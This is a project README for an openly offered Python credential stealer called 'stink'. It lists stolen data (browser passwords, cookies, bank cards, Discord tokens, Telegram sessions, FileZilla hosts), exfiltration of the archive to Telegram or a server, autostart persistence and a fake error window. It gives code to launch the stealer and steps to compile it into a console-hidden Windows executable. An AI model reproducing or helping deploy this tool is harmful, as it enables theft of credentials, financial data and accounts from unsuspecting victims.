# stink

Stealer in just a few lines with sending to Telegram / Server.

**Wiki:** https://github.com/FallenAstaroth/stink/wiki

## Description
The `stink` already has an impressive functionality that will only expand.

## Navigation
* [Current features](#Сurrent-features)
* [Example usage](#Example-usage)
  * [Standard](#Standard)
  * [Certain modules](#Certain-modules)
  * [Additional parameters](#Additional-parameters)
* [Creating exe](#Creating-exe)
  * [Creating executable file](#Creating-executable-file)
  * [With BAT](#With-BAT)
  * [With CMD](#With-CMD)

### Current features
1. Support for the following browsers:
   - Chrome
   - Opera
   - Opera GX
   - Edge
   - Brave
   - Vivaldi
2. Collecting the following data:
   - Screenshot
   - Cookies
   - Passwords
   - Bank cards
   - History
   - Bookmarks
   - IP-address
   - System configuration
   - Active processes
   - Discord tokens
   - Telegram sessions
   - FileZilla hosts
3. Support for browser multiprofiles.
4. Sending an archive of collected data to Telegram / Server.
5. Execution in a separate thread.
6. Execution using multiprocessor.
7. Possibility to add to autostart.
8. Showing a window with a fake error.

## Example usage
### Standard
```python
from stink import Stealer
from stink.utils.senders import TelegramSender

if __name__ == '__main__':
    Stealer(senders=[TelegramSender(token="YOUR_TOKEN", user_id=YOUR_ID)]).run()

```
### Certain modules

An example with only system data collection and screenshot.
```python
from stink import Stealer
from stink.enums import Features
from stink.utils.senders import TelegramSender

if __name__ == '__main__':
    Stealer(senders=[TelegramSender(token="YOUR_TOKEN", user_id=YOUR_ID)], features=[Features.system, Features.screenshot]).run()
```
### Additional parameters

- `features` - enables the modules from the list.

  - `passwords` - collecting passwords.

  - `cookies` - collecting cookies.

  - `cards` - collecting of bank cards.

  - `history` - collecting search history.

  - `bookmarks` - collecting bookmarks.

  - `processes` - collecting of active processes.

  - `system` - collecting system configuration.

  - `screen` - screenshot.

  - `discord` - collecting Discord tokens.

  - `telegram` - collecting Telegram sessions.

  - `filezilla` - collecting FileZilla hosts.

Pass if you want to include only certain modules. Modules for the list can be imported from `stink.enums.Features`.


- `utils` - enables the utilities from the list.

  - `errors` - error output.

  - `autostart` - adding to autostart.

  - `message` - showing a fake error window.

Pass it on if you want to include additional utilities. Utilities for the list can be imported from `stink.enums.Utils`.

## Creating exe
Python is an interpreted programming language, so we first translate it into C and then compile it into an .exe file.
We will need Nuitka to do this.

### Creating executable file

1. [Download](https://github.com/FallenAstaroth/stink/archive/refs/heads/master.zip) archive.
2. Unpack the archive and go to the directory stink-master.
3. Create test.py (or any other name) file in the same directory with the following code:
```python
from stink import Stealer
from stink.utils.senders import TelegramSender

if __name__ == '__main__':
    Stealer(senders=[TelegramSender(token="YOUR_TOKEN", user_id=YOUR_ID)]).run()
```

#### With BAT
1. Run compiler.bat.


#### With CMD
1. Open `cmd`.
2. Type in the command:
```
pip install virtualenv
```
3. Go to the folder with the `test.py` file:
```
cd path\to\file
```
4. Create a virtual environment and activate it:
```
virtualenv venv
```
```
venv\Scripts\activate
```
5. Install the requirements:
```
pip install -r requirements.txt
```
6. Install the Nuitka:
```
pip install Nuitka==0.6.16.4
```
7. To reduce the file size, additionally install Zstandard (optional):
```
pip install zstandard==0.17.0
```
8. Write the command:
```
nuitka --onefile --plugin-enable=multiprocessing --windows-disable-console test.py
```

After executing the command we get the test.exe file with the hidden console.
